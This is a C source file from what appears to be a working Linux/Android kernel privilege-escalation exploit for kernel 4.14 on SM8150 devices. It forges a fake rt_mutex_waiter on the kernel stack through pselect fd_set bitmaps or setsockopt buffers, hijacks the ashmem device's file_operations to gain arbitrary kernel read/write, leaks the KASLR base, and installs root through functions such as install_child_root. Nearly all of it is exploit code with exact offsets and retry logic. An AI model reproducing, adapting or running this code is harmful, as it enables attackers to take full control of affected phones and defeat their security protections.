#include "common.h"
#include "runtime_struct_offsets.h"
#include <time.h>
static double fops_elapsed_ms(struct timespec *ref) {
  struct timespec now;
  clock_gettime(CLOCK_MONOTONIC, &now);
  return (now.tv_sec - ref->tv_sec) * 1000.0 + (now.tv_nsec - ref->tv_nsec) / 1e6;
}
extern int pselect_custom_write;

#define PSELECT_CFI_ROUTE_ATTEMPTS 8
#define PSELECT_EXPECTED_READY 9

atomic_int cfi_stage_done;
ssize_t cfi_write_ret = -1;
ssize_t cfi_read_ret = -1;
ssize_t cfi_read_slot_ret = -1;
ssize_t cfi_owner_ret = -1;
ssize_t cfi_restore_ret = -1;
uint64_t fops_before;
uint64_t fops_after;
int cfi_attempts;
int pipe_stage_attempts;
int cfi_dirty_seen;
int cfi_last_step;
int cfi_last_errno;
int kaslr_done;
int kaslr_step;
uint64_t kaslr_fops_alias;
uint64_t kaslr_open_ptr;
uint64_t kaslr_ioctl_ptr;
uint64_t kaslr_mmap_ptr;
uint64_t kaslr_release_ptr;
uint64_t kaslr_show_fdinfo_ptr;
uint64_t kaslr_base;
uint64_t kaslr_slide;
uint64_t kaslr_expected_ioctl;
uint64_t kaslr_expected_mmap;
uint64_t kaslr_expected_release;
uint64_t kaslr_expected_show_fdinfo;
uint64_t slide_bootid_before;
uint64_t slide_bootid_after;
uint64_t slide_bootid_want;
ssize_t slide_bootid_restore_ret = -1;

static int route_delay_usec(int attempt) {
#ifdef COMPAT32
  /* shift=6 route: select blocks; fire the walk while do_select() is parked. */
  int default_delay = 20000;
#else
  int default_delay = pselect_custom_write_enabled() ? 0 : -1;
#endif
  int override = env_int_range("PSELECT_ROUTE_DELAY_USEC",
                               default_delay, -1, 1000000);
  if (override >= 0) {
    return override;
  }

  static const int delays[] = {
    50000, 30000, 70000, 10000, 100000, 150000, 20000, 120000,
  };

  int count = (int)(sizeof(delays) / sizeof(delays[0]));
  return delays[(attempt - 1) % count];
}

void fdset_put_word(fd_set *set, int word, uint64_t value) {
#ifdef COMPAT32
  /* compat_get_bitmap(): internal word k == user32[2k] | user32[2k+1]<<32 */
  uint32_t *bits = (uint32_t *)set;
  bits[2 * word] = (uint32_t)value;
  bits[2 * word + 1] = (uint32_t)(value >> 32);
#else
  unsigned long *bits = (unsigned long *)set;
  bits[word] = (unsigned long)value;
#endif
}

uint64_t fdset_get_word(const fd_set *set, int word) {
#ifdef COMPAT32
  const uint32_t *bits = (const uint32_t *)set;
  return ((uint64_t)bits[2 * word + 1] << 32) | bits[2 * word];
#else
  const unsigned long *bits = (const unsigned long *)set;
  return bits[word];
#endif
}

static int pselect_words_per_set(void) {
  /* The kernel's struct fd_set_bits always uses native 64-bit longs
   * (BITS_PER_LONG == 64) even on the compat (32-bit) path -- verified in
   * compat_core_sys_select: size = FDS_LONGS(n)*8 with FDS_LONGS = (n+63)/64.
   * So the per-set word count must be computed with 64-bit words in both the
   * 64-bit and 32-bit builds.  sizeof(unsigned long) is 4 in the armhf child,
   * which previously yielded 10 instead of 5 and misplaced every painted
   * waiter field by 5 longs (40 bytes). */
  return (PSELECT_ROUTE_NFDS + 63) / 64;
}

static int pselect_put_global_word(
    fd_set *in, fd_set *out, fd_set *ex, int words_per_set,
    int global_word, uint64_t value) {
  if (global_word < 0) {
    return 0;
  }

  /* The kernel lays out bits = in|out|ex|res_in|res_out|res_ex, each
   * words_per_set longs.  do_select computes res_X = X & ready, so forcing
   * res_X word k means writing X word k (with those fds selected+ready).
   * On 4.14 the pselect6 route puts the freed rt_mutex_waiter at word 12:
   * task(6)/lock(7) land in res_in, prio(8)/deadline(9) in res_out. */
  int set_idx = global_word / words_per_set;
  int word_idx = global_word % words_per_set;
  switch (set_idx) {
    case 0: /* in */
    case 3: /* res_in  <- in  word k */
      fdset_put_word(in, word_idx, value);
      return 1;
    case 1: /* out */
    case 4: /* res_out <- out word k */
      fdset_put_word(out, word_idx, value);
      return 1;
    case 2: /* ex */
    case 5: /* res_ex  <- ex  word k */
      fdset_put_word(ex, word_idx, value);
      return 1;
    default:
      return 0;
  }
}

static void pselect_put_waiter_word(
    fd_set *in, fd_set *out, fd_set *ex, int words_per_set,
    int waiter_word, uint64_t value, const char *name) {
  int shift = env_int_range("PSELECT_SHIFT", PSELECT_WAITER_WORD_SHIFT, -14, 14);
  int global_word = shift + waiter_word;
  int placed = pselect_put_global_word(
      in, out, ex, words_per_set, global_word, value);
  if (!placed) {
    pr_warning("pselect cannot place %s waiter_word=%d global_word=%d "
               "words_per_set=%d nfds=%d\n",
               name, waiter_word, global_word, words_per_set,
               PSELECT_ROUTE_NFDS);
  }
}

#ifdef COMPAT32
static int compat_fd_isset(const fd_set *set, int fd) {
  const uint32_t *w = (const uint32_t *)set;
  int k = fd / 64, j = fd % 64;
  return (w[2 * k + (j >> 5)] >> (j & 31)) & 1u;
}
#define FD_ISSET(fd, set) compat_fd_isset((set), (fd))
#endif

void open_selected_fds(
    fd_set *in, fd_set *out, fd_set *ex, int read_fd, int write_fd) {
  (void)write_fd;

  int high_read = fcntl(read_fd, F_DUPFD, PSELECT_ROUTE_NFDS + 32);
  if (high_read < 0) {
    pr_warning("pselect F_DUPFD read errno=%d\n", errno);
    return;
  }
  for (int fd = 0; fd < PSELECT_ROUTE_NFDS; fd++) {
    if (FD_ISSET(fd, in) || FD_ISSET(fd, out) || FD_ISSET(fd, ex)) {
      dup2(high_read, fd);
    }
  }
  close(high_read);
  dup2(read_fd, PSELECT_ROUTE_NFDS - 1);
  FD_SET(PSELECT_ROUTE_NFDS - 1, ex);
}

void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
  FD_ZERO(in);
  FD_ZERO(out);
  FD_ZERO(ex);

  if (env_flag("PSELECT_SIMPLE_LAYOUT", 0)) {
    fdset_put_word(in, 0, fake_w0);
    fdset_put_word(in, 3, 0);
    fdset_put_word(ex, 0,
                   pselect_custom_write_enabled() ? fake_task :
                   text_addr(INIT_TASK));
    fdset_put_word(ex, 1, fake_lock);
    fdset_put_word(ex, 2, 3);
    fdset_put_word(ex, 3, 0);
    return;
  }

  int compact = active_offsets && active_offsets->waiter_compact;

  int words_per_set = pselect_words_per_set();
  struct pselect_waiter_word {
    int word;
    uint64_t value;
    const char *name;
  };

  struct pselect_waiter_word words_compact[] = {
    {2, 0, "tree_left"},
    {3, 0, "pi_parent"},
    {4, 0, "pi_right"},
    {5, 0, "pi_left"},
    {6, pselect_custom_write_enabled() ? fake_task : text_addr(INIT_TASK), "task"},
    {7, fake_lock, "lock"},
    {8, 0, "prio"},
    {9, 0, "deadline"},
  };

  struct pselect_waiter_word words[] = {
    {2, 0, "tree_pc"},
    {3, 0, "tree_right"},
    {4, 0, "tree_left"},
    {5, 1, "tree_prio"},
    {6, 0, "tree_deadline"},
    {7, 0, "pi_parent"},
    {8, 0, "pi_right"},
    {9, 0, "pi_left"},
    {10, 1, "pi_prio"},
    {11, 0, "pi_deadline"},
    {12, pselect_custom_write_enabled() ? fake_task : text_addr(INIT_TASK),
     "task"},
    {13, fake_lock, "lock"},
    {14, 3, "wake_state"},
  };

  struct pselect_waiter_word *active_words = compact ? words_compact : words;
  size_t active_count = compact
      ? sizeof(words_compact) / sizeof(words_compact[0])
      : sizeof(words) / sizeof(words[0]);

  for (size_t i = 0; i < active_count; i++) {
    struct pselect_waiter_word *w = &active_words[i];
    pselect_put_waiter_word(
        in, out, ex, words_per_set, w->word, w->value, w->name);
  }
}

void do_pselect_fake_lock_route(void) {
  if (!page_base || !fake_lock || !fake_fops) {
    cfi_last_step = 30;
    cfi_last_errno = 0;
    pr_error("pselect route missing kernel page base=%016zx lock=%016zx fops=%016zx\n",
             page_base, fake_lock, fake_fops);
    return;
  }

  struct timespec route_t0;
  clock_gettime(CLOCK_MONOTONIC, &route_t0);
  int calls = 0;
  int success = 0;
  int route_verified = 0;
  for (int route_attempt = 1; route_attempt <= PSELECT_CFI_ROUTE_ATTEMPTS;
       route_attempt++) {
    if (route_attempt != 1) {
      page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
      if (!page_base || !fake_lock || !fake_fops) {
        cfi_last_step = 34;
        cfi_last_errno = errno;
        pr_error("pselect retry page prepare failed attempt=%d base=%016zx "
                 "lock=%016zx fops=%016zx\n",
                 route_attempt, page_base, fake_lock, fake_fops);
        break;
      }
    }

    int pipefd[2];
    SYSCHK(pipe(pipefd));
#ifdef COMPAT32
    int block_fd = pipefd[0]; /* empty read end: do_select will block */
#else
    int block_fd = (int)syscall(SYS_timerfd_create, CLOCK_MONOTONIC, 0);
    if (block_fd < 0) {
      pr_warning("pselect timerfd_create failed errno=%d; using pipe read end\n",
                 errno);
      block_fd = pipefd[0];
    }
#endif
    if (block_fd >= 0 && block_fd != pipefd[0]) {
      struct itimerspec its; memset(&its, 0, sizeof its);
      its.it_value.tv_nsec = 1000;
      syscall(SYS_timerfd_settime, block_fd, 0, &its, NULL);
    }
    int high_read = fcntl(block_fd, F_DUPFD, PSELECT_ROUTE_NFDS + 16);
    if (high_read < 0) {
      cfi_last_step = 31;
      cfi_last_errno = errno;
      pr_error("pselect F_DUPFD read errno=%d\n", errno);
      if (block_fd != pipefd[0]) {
        close(block_fd);
      }
      close(pipefd[0]);
      close(pipefd[1]);
      break;
    }

    fd_set in;
    fd_set out;
    fd_set ex;
    prepare_pselect_fdsets(&in, &out, &ex);
    pr_info("pselect route setup attempt=%d simple=%d shift=%d page=%016zx "
            "fake_lock=%016zx fake_w0=%016zx fake_task=%016zx "
            "in0=%016llx in3=%016llx out0=%016llx ex0=%016llx "
            "ex1=%016llx ex2=%016llx ex3=%016llx\n",
            route_attempt,
            env_flag("PSELECT_SIMPLE_LAYOUT", 0),
            env_int_range("PSELECT_SHIFT", PSELECT_WAITER_WORD_SHIFT, -14, 14),
            page_base, fake_lock, fake_w0, fake_task,
            (unsigned long long)fdset_get_word(&in, 0),
            (unsigned long long)fdset_get_word(&in, 3),
            (unsigned long long)fdset_get_word(&out, 0),
            (unsigned long long)fdset_get_word(&ex, 0),
            (unsigned long long)fdset_get_word(&ex, 1),
            (unsigned long long)fdset_get_word(&ex, 2),
            (unsigned long long)fdset_get_word(&ex, 3));
    open_selected_fds(&in, &out, &ex, high_read, pipefd[1]);

    atomic_store(&consumer_calls, 0);
    atomic_store(&consumer_success, 0);
    atomic_store(&punch_consume_stop, 0);
    atomic_store(&pselect_select_done, 0);
    atomic_store(&pselect_walk_done, 0);
    int delay_usec = route_delay_usec(route_attempt);
    atomic_store(&main_route_delay_usec, delay_usec);
    atomic_store(&punch_consume_go, route_attempt);

    struct timeval timeout = {
      .tv_sec = PSELECT_TIMEOUT_SEC,
#ifdef PSELECT_TIMEOUT_USEC
      .tv_usec = PSELECT_TIMEOUT_USEC,
#else
      .tv_usec = 0,
#endif
    };

    pr_info("pselect pre-select +%.0fms\n", fops_elapsed_ms(&route_t0));
    errno = 0;
#ifdef COMPAT32
    int ret = syscall(142 /* ARM _newselect -> compat_sys_select */,
                      PSELECT_ROUTE_NFDS, &in, &out, &ex, &timeout);
#else
    int ret = select(PSELECT_ROUTE_NFDS, &in, &out, &ex, &timeout);
#endif
    int saved_errno = errno;
    /* do_select() filled res_in; park in userspace (no syscall) so the
     * consumer's rt_mutex_adjust_pi() reads the intact fake waiter. */
    atomic_store(&pselect_select_done, 1);
    for (int spin = 0;
         spin < 2000000000 && !atomic_load(&pselect_walk_done);
         spin++) {
      __asm__ volatile("yield" ::: "memory");
    }
    pr_info("pselect post-select +%.0fms ret=%d walked=%d\n",
            fops_elapsed_ms(&route_t0), ret, atomic_load(&pselect_walk_done));
    pr_info("pselect RB in3=%016llx in4=%016llx out0=%016llx out1=%016llx "
            "(want task=%016zx lock=%016zx)\n",
            (unsigned long long)fdset_get_word(&in, 3),
            (unsigned long long)fdset_get_word(&in, 4),
            (unsigned long long)fdset_get_word(&out, 0),
            (unsigned long long)fdset_get_word(&out, 1),
            fake_task, fake_lock);
    atomic_store(&punch_consume_go, 0);
    calls = atomic_load(&consumer_calls);
    success = atomic_load(&consumer_success);
    pr_info("pselect returned attempt=%d ret=%d errno=%d calls=%d success=%d delay=%d\n",
            route_attempt, ret, saved_errno, calls, success, delay_usec);

    int route_quality_miss = 0;
    int route_signal = calls > 0 && success > 0;
    int cfi_probed = 0;
    if (route_signal) {
      cfi_probed = 1;
      if (ret != PSELECT_EXPECTED_READY) {
        pr_info("pselect route probing cfi attempt=%d ret=%d expected=%d\n",
                route_attempt, ret, PSELECT_EXPECTED_READY);
      }
      if (pselect_custom_write_enabled()) {
        cfi_last_step = 0;
        cfi_last_errno = 0;
        route_verified = 1;
        if (route_only_mode) {
          /* 32-bit route child: the 64-bit parent runs try_cfi_stage() */
        } else if (active_offsets && active_offsets->off_system_unbound_wq &&
            !root_child_done) {
          try_cfi_stage();
        }
      } else if (try_cfi_stage()) {
        cfi_last_step = 0;
        route_verified = 1;
      } else if (!cfi_last_step) {
        cfi_last_step = 32;
      }
    }
    if (!route_verified && route_signal) {
      route_quality_miss = 1;
      if (!cfi_probed) {
        cfi_last_step = 35;
        cfi_last_errno = saved_errno;
      }
      pr_info("pselect route quality miss attempt=%d/%d ret=%d expected=%d delay=%d; refreshing FOPS page\n",
              route_attempt, PSELECT_CFI_ROUTE_ATTEMPTS, ret,
              PSELECT_EXPECTED_READY, delay_usec);
    } else if (!route_verified) {
      cfi_last_step = 33;
      cfi_last_errno = saved_errno;
    }

    close(high_read);
    if (block_fd != pipefd[0]) {
      close(block_fd);
    }
    close(pipefd[0]);
    close(pipefd[1]);

    if (route_quality_miss) {
      continue;
    }
    if (route_verified || cfi_dirty_seen || cfi_last_step != 1) {
      break;
    }
    pr_info("pselect cfi write miss attempt=%d/%d errno=%d; refreshing FOPS page\n",
            route_attempt, PSELECT_CFI_ROUTE_ATTEMPTS, cfi_last_errno);
  }
  pr_info("pselect route done calls=%d success=%d step=%d errno=%d\n",
          calls, success, cfi_last_step, cfi_last_errno);
}


/* ============================================================================
 * setsockopt-based stack overlay (native 64-bit, Linux 4.14 on SM8150)
 *
 * Why: the pselect route paints the dangling rt_mutex_waiter through fd_set
 * bitmaps, which drags in word/shift/ABI/`res_*`-zeroing complications.  A far
 * simpler stack writer exists: sock_setsockopt() with an unknown
 * SOL_SOCKET optname keeps a 256-byte buffer on the kernel stack and copies
 * user bytes into it verbatim.
 *
 * Geometry verified from the device kernel (Image @ 0xffffff8008000000):
 *   SyS_setsockopt  : stp x29,x16,[sp,#-80]!   -> 0x50
 *   sock_setsockopt : sub sp,sp,#0x180, buf = sp+0x10  -> 0x180
 *   => buf = SP0 - 0x1c0   (fixed; no shift guessing)
 *   SyS_futex (native): sub sp,sp,#0x70 ; do_futex frame 0x210, rt_waiter=sp+0xd0
 *   => dangling waiter = SP0 - 0x1b0
 *   rt_mutex_waiter: task @ +0x30, lock @ +0x38
 *   => waiter->task == buf[0x40] ,  waiter->lock == buf[0x48]
 *
 * optname 1000 (0x3e8) takes the path:
 *     add x0, sp, #0x10 ; bl memset(buf,0,0xff)
 *     csel len = min(optlen, 0xfe) ; bl __arch_copy_from_user(buf, optval, len)
 * i.e. the copy happens before any optname handling, unprivileged.
 *
 * NOTE: setsockopt does not block.  The consumer fires while this thread parks
 * in userspace (no further syscalls), so the kernel stack region stays intact.
 * ============================================================================ */
int sock_paint_fd = -1;

void do_setsockopt_fake_lock_route(void) {
  if (!fake_lock || !fake_task) {
    cfi_last_step = 40;
    pr_error("ssopt route missing lock=%016zx task=%016zx\n", fake_lock, fake_task);
    return;
  }
  if (sock_paint_fd < 0) {
    sock_paint_fd = socket(AF_INET, SOCK_STREAM, 0);
    if (sock_paint_fd < 0) {
      cfi_last_step = 41;
      pr_error("ssopt socket() errno=%d\n", errno);
      return;
    }
  }

  struct timespec t0;
  clock_gettime(CLOCK_MONOTONIC, &t0);
  int calls = 0, success = 0;
  for (int attempt = 1; attempt <= PSELECT_CFI_ROUTE_ATTEMPTS; attempt++) {
    unsigned char buf[0x60];
    memset(buf, 0, sizeof buf);
    if (env_flag("SSOPT_SCAN", 0)) {
      /* one-run probe: distinct non-canonical value per buf slot so the panic
       * register x24 reveals which slot lands on waiter->lock */
      for (int i = 0; i < 0x60; i += 8)
        put64(buf, i, 0x1a2b00000000ULL + (uint64_t)i);
    } else if (env_flag("SSOPT_SCAN2", 0)) {
      /* probe: distinct marker per slot, but keep lock valid so the walk
       * passes trylock and reaches rb_erase; panic x24 -> slot of
       * waiter->lock, x9 -> slot of waiter->tree_entry.parent_color */
      for (int i = 0; i < 0x60; i += 8)
        put64(buf, i, 0x1a2b00000000ULL + (uint64_t)i);
      put64(buf, 0x40, fake_task);
      put64(buf, 0x48, fake_lock);
    } else if (env_flag("SSOPT_RANGE", 0)) {
      /* diagnostic: paint a solid run so a wrong offset still hits lock */
      for (int i = 0x10; i <= 0x58; i += 8) put64(buf, i, fake_lock);
    } else {
      put64(buf, 0x40, pselect_custom_write_enabled() ? fake_task
                                                      : text_addr(INIT_TASK));
      put64(buf, 0x48, fake_lock);
    }

    atomic_store(&consumer_calls, 0);
    atomic_store(&consumer_success, 0);
    atomic_store(&punch_consume_stop, 0);
    atomic_store(&pselect_select_done, 0);
    atomic_store(&pselect_walk_done, 0);
    int delay_usec = route_delay_usec(attempt);
    if (delay_usec < 20000) delay_usec = 20000;
    atomic_store(&main_route_delay_usec, delay_usec);

    pr_info("ssopt pre paint +%.0fms attempt=%d task=%016zx lock=%016zx len=%zu\n",
            fops_elapsed_ms(&t0), attempt, fake_task, fake_lock, sizeof buf);
    errno = 0;
    socklen_t paint_len = (env_flag("SSOPT_RANGE", 0) || env_flag("SSOPT_SCAN", 0) ||
                            env_flag("SSOPT_SCAN2", 0))
                               ? 0x60 : 0x50;
    int ret = setsockopt(sock_paint_fd, SOL_SOCKET, 1000, buf, paint_len);
    int saved_errno = errno;
    if (env_flag("SSOPT_LOG", 0))
      pr_info("ssopt paintret ret=%d errno=%d fd=%d base=%016zx task=%016zx "
              "lock=%016zx\n",
              ret, saved_errno, sock_paint_fd, page_base, fake_task, fake_lock);
    atomic_store(&pselect_select_done, 1);
    atomic_store(&punch_consume_go, attempt);
    /* Constructive fix (setsockopt + blocking select):
     *  - setsockopt already painted waiter->task (buf[0x40]) and waiter->lock
     *    (buf[0x48]); those are at SP0-0x180 / SP0-0x178 == bits words 18 / 19.
     *  - Now stay INSIDE the kernel so the syscall-exit path cannot clobber the
     *    paint, AND zero the dangling waiter's tree_entry/pi_tree.
     *  - select(192) -> core_sys_select(n=192) processes exactly
     *    FDS_LONGS(192)=3 longs/set * 6 sets = 18 stack words at
     *    bits = SP0-0x210 == words 0..17 == SP0-0x210..SP0-0x188.  Since
     *    waiter = SP0-0x1b0 = bits word 12, this zeroes waiter+0x00..0x2f
     *    (tree_entry@0x00 + pi_tree@0x18) while words 18/19 (task@0x30 /
     *    lock@0x38) are NOT processed -> the setsockopt paint survives. */
    {
      fd_set blk_in, blk_out, blk_ex;
      FD_ZERO(&blk_in); FD_ZERO(&blk_out); FD_ZERO(&blk_ex);
      struct timeval blk_tv = { .tv_sec = 0, .tv_usec = 300000 };
      select(192, &blk_in, &blk_out, &blk_ex, &blk_tv);
    }
    for (int spin = 0;
         spin < 2000000000 && !atomic_load(&pselect_walk_done);
         spin++) {
      __asm__ volatile("yield" ::: "memory");
    }
    pr_info("ssopt post paint +%.0fms ret=%d errno=%d walked=%d\n",
            fops_elapsed_ms(&t0), ret, saved_errno,
            atomic_load(&pselect_walk_done));
    atomic_store(&punch_consume_go, 0);
    calls = atomic_load(&consumer_calls);
    success = atomic_load(&consumer_success);
    pr_info("ssopt done attempt=%d calls=%d success=%d delay=%d step=%d errno=%d\n",
            attempt, calls, success, delay_usec, cfi_last_step, cfi_last_errno);
    if (calls > 0 && success > 0) {
      if (!route_only_mode) {
        try_cfi_stage();
      }
      break;
    }
  }
}

int repair_fake_fops_llseek(int fd) {
  uint64_t llseek = text_addr(NOOP_LLSEEK);
  uint64_t after = 0;
  uintptr_t slot = fake_fops + FOPS_LLSEEK_OFF;
  ssize_t wr = configfs_write_once(fd, slot, &llseek, sizeof(llseek));
  ssize_t rd = configfs_read_once(fd, slot, &after, sizeof(after));
  return wr == (ssize_t)sizeof(llseek) &&
         rd == (ssize_t)sizeof(after) &&
         after == llseek;
}

int refresh_fake_fops_text(int fd) {
  struct fops_slot {
    size_t off;
    uint64_t value;
  } slots[] = {
    {FOPS_READ_ITER_OFF, text_addr(CONFIGFS_READ_ITER)},
    {FOPS_WRITE_ITER_OFF, text_addr(CONFIGFS_BIN_WRITE_ITER)},
    {FOPS_IOCTL_OFF, text_addr(ASHMEM_IOCTL)},
    {FOPS_COMPAT_IOCTL_OFF, text_addr(ASHMEM_COMPAT_IOCTL)},
    {FOPS_MMAP_OFF, text_addr(ASHMEM_MMAP)},
    {FOPS_OPEN_OFF, text_addr(ASHMEM_OPEN)},
    {FOPS_RELEASE_OFF, text_addr(ASHMEM_RELEASE)},
    {FOPS_SPLICE_READ_OFF, text_addr(COPY_SPLICE_READ)},
    {FOPS_SHOW_FDINFO_OFF, text_addr(ASHMEM_SHOW_FDINFO)},
  };

  for (size_t i = 0; i < sizeof(slots) / sizeof(slots[0]); i++) {
    uintptr_t target = fake_fops + slots[i].off;
    if (kernel_write_data(fd, target, &slots[i].value,
        sizeof(slots[i].value)) !=
        (ssize_t)sizeof(slots[i].value)) {
      return 0;
    }
  }
  return 1;
}

int leak_kernel_base(int fd) {
  kaslr_fops_alias = p0_data_alias(ASHMEM_FOPS);
  kaslr_open_ptr = kernel_read64(fd, kaslr_fops_alias + FOPS_OPEN_OFF);
  kaslr_ioctl_ptr = kernel_read64(fd, kaslr_fops_alias + FOPS_IOCTL_OFF);
  kaslr_mmap_ptr = kernel_read64(fd, kaslr_fops_alias + FOPS_MMAP_OFF);
  kaslr_release_ptr = kernel_read64(fd, kaslr_fops_alias + FOPS_RELEASE_OFF);
  kaslr_show_fdinfo_ptr =
    kernel_read64(fd, kaslr_fops_alias + FOPS_SHOW_FDINFO_OFF);

  if (!is_kernel_ptr(kaslr_open_ptr) || !is_kernel_ptr(kaslr_ioctl_ptr) ||
      !is_kernel_ptr(kaslr_mmap_ptr) || !is_kernel_ptr(kaslr_release_ptr) ||
      !is_kernel_ptr(kaslr_show_fdinfo_ptr)) {
    kaslr_step = 1;
    return 0;
  }

  kaslr_base = kaslr_open_ptr - (ASHMEM_OPEN - KIMAGE_TEXT_BASE);
  kaslr_slide = kaslr_base - KIMAGE_TEXT_BASE;
  kaslr_done = 1;
  kaslr_expected_ioctl = text_addr(ASHMEM_IOCTL);
  kaslr_expected_mmap = text_addr(ASHMEM_MMAP);
  kaslr_expected_release = text_addr(ASHMEM_RELEASE);
  kaslr_expected_show_fdinfo = text_addr(ASHMEM_SHOW_FDINFO);

  if (kaslr_ioctl_ptr != kaslr_expected_ioctl ||
      kaslr_mmap_ptr != kaslr_expected_mmap ||
      kaslr_release_ptr != kaslr_expected_release ||
      kaslr_show_fdinfo_ptr != kaslr_expected_show_fdinfo) {
    kaslr_done = 0;
    kaslr_step = 2;
    return 0;
  }

  if (!refresh_fake_fops_text(fd)) {
    kaslr_done = 0;
    kaslr_step = 3;
    return 0;
  }

  kaslr_step = 0;
  return 1;
}

int restore_slide_boot_id(int fd) {
  uintptr_t boot_id_data = SLIDE_RANDOM_BOOT_ID_DATA;
  slide_bootid_want = slide_canon_addr(SLIDE_SYSCTL_BOOTID);
  configfs_read_once(
      fd, boot_id_data, &slide_bootid_before, sizeof(slide_bootid_before));
  slide_bootid_restore_ret =
    configfs_write_once(
        fd, boot_id_data, &slide_bootid_want, sizeof(slide_bootid_want));
  configfs_read_once(
      fd, boot_id_data, &slide_bootid_after, sizeof(slide_bootid_after));
  pr_info("slide restore boot_id data pid=%d ret=%zd before=%016llx "
          "want=%016llx after=%016llx errno=%d\n",
          getpid(), slide_bootid_restore_ret,
          (unsigned long long)slide_bootid_before,
          (unsigned long long)slide_bootid_want,
          (unsigned long long)slide_bootid_after, errno);
  return slide_bootid_restore_ret == (ssize_t)sizeof(slide_bootid_want) &&
         slide_bootid_after == slide_bootid_want;
}

int install_child_root(int fd) {
  if (!install_pipe_physrw(fd)) return 0;
  if (install_umh_root(fd)) return 1;
  return install_android_root(fd);
}

int try_cfi_stage(void) {
  cfi_attempts++;
  int fd = open_ashmem_device();
  int dirty = 0;
  int can_read_back = 0;

  if (fd < 0) {
    cfi_last_step = 11;
    cfi_last_errno = errno;
    pr_info("cfi open failed path=%s errno=%d\n", ashmem_path, errno);
    return 0;
  }

  pr_info("cfi attempt=%d fd=%d path=%s fake_fops=%016zx target=%016zx "
          "ioctl=%016llx open=%016llx write_iter=%016llx\n",
          cfi_attempts, fd, ashmem_path, fake_fops, binwrite_target,
          (unsigned long long)text_addr(ASHMEM_IOCTL),
          (unsigned long long)text_addr(ASHMEM_OPEN),
          (unsigned long long)text_addr(CONFIGFS_BIN_WRITE_ITER));

  uintptr_t misc_fops = data_addr(ASHMEM_MISC_FOPS);
  char payload[] = "CFI_FRIENDLY_CONFIGFS_BIN_WRITE_OK";
  ssize_t n =
    configfs_write_once(fd, binwrite_target, payload, sizeof(payload));
  cfi_write_ret = n;
  pr_info("cfi write ret=%zd errno=%d\n", n, errno);
  if (n != (ssize_t)sizeof(payload)) {
    cfi_last_step = 1;
    cfi_last_errno = errno;
    goto fail;
  }
  dirty = 1;
  cfi_dirty_seen = 1;

  if (!repair_fake_fops_llseek(fd)) {
    cfi_last_step = 2;
    cfi_last_errno = errno;
    goto fail;
  }
  cfi_read_slot_ret = sizeof(uint64_t);
  can_read_back = 1;

  char readback[sizeof(payload)];
  memset(readback, 0, sizeof(readback));
  ssize_t r =
    configfs_read_once(fd, binwrite_target, readback, sizeof(readback));
  cfi_read_ret = r;
  pr_info("cfi read ret=%zd errno=%d\n", r, errno);
  if (r != (ssize_t)sizeof(readback) ||
      memcmp(readback, payload, sizeof(payload)) != 0) {
    cfi_last_step = 3;
    cfi_last_errno = errno;
    goto fail;
  }

  uint64_t before = 0;
  ssize_t rb = configfs_read_once(fd, misc_fops, &before, sizeof(before));
  fops_before = before;
  pr_info("cfi fops_before ret=%zd value=%016llx want=%016zx errno=%d\n",
          rb, (unsigned long long)before, fake_fops, errno);
  if (rb != (ssize_t)sizeof(before) || before != fake_fops) {
    cfi_last_step = 4;
    cfi_last_errno = errno;
    goto fail;
  }

  if (!restore_slide_boot_id(fd)) {
    cfi_last_step = 10;
    cfi_last_errno = errno;
    goto fail;
  }

  if (!leak_kernel_base(fd)) {
    cfi_last_step = 9;
    cfi_last_errno = errno;
    goto fail;
  }

  int installed = 0;
  pipe_stage_attempts = 0;
  for (int attempt = 0; attempt < PIPE_MAX_ATTEMPTS; attempt++) {
    pipe_stage_attempts++;
    if (attempt != 0) {
      reset_pipe_attempt();
    }
    if (install_child_root(fd)) {
      installed = 1;
      break;
    }
    if (pipe_cache_gate_ok && physrw_read_ok && physrw_write_ok &&
        physrw_read64_ok && physrw_write64_ok) {
      break;
    }
  }

  if (!installed) {
    cfi_last_step = 8;
    cfi_last_errno = errno;
    goto fail;
  }

  uint64_t original_fops = canon_addr(ASHMEM_FOPS);
  ssize_t restore = configfs_write_once(
      fd, misc_fops, &original_fops, sizeof(original_fops));
  cfi_restore_ret = restore;
  if (restore != (ssize_t)sizeof(original_fops)) {
    cfi_last_step = 5;
    cfi_last_errno = errno;
    goto fail;
  }

  uint64_t after = 0;
  ssize_t ra = configfs_read_once(fd, misc_fops, &after, sizeof(after));
  fops_after = after;
  if (ra != (ssize_t)sizeof(after) || after != canon_addr(ASHMEM_FOPS)) {
    cfi_last_step = 6;
    cfi_last_errno = errno;
    goto fail;
  }

  uint64_t null_owner = 0;
  ssize_t owner =
    configfs_write_once(fd, fake_fops, &null_owner, sizeof(null_owner));
  cfi_owner_ret = owner;
  SYSCHK(close(fd));
  if (owner == (ssize_t)sizeof(null_owner) &&
      restore == (ssize_t)sizeof(original_fops)) {
    cfi_last_step = 0;
    cfi_last_errno = 0;
    atomic_store(&cfi_stage_done, 1);
    return 1;
  }
  cfi_last_step = 7;
  cfi_last_errno = errno;
  return 0;

fail:
  if (dirty) {
    uint64_t original_fops_fail = p0_data_alias(ASHMEM_FOPS);
    if (kaslr_done) {
      original_fops_fail = canon_addr(ASHMEM_FOPS);
    }
    cfi_restore_ret = configfs_write_once(
        fd, misc_fops, &original_fops_fail, sizeof(original_fops_fail));
    if (can_read_back &&
        cfi_restore_ret == (ssize_t)sizeof(original_fops_fail)) {
      uint64_t after_fail = 0;
      if (configfs_read_once(fd, misc_fops, &after_fail, sizeof(after_fail)) ==
          (ssize_t)sizeof(after_fail)) {
        fops_after = after_fail;
      }
    }
    uint64_t null_owner_fail = 0;
    cfi_owner_ret = configfs_write_once(
        fd, fake_fops, &null_owner_fail, sizeof(null_owner_fail));
  }
  SYSCHK(close(fd));
  return 0;
}
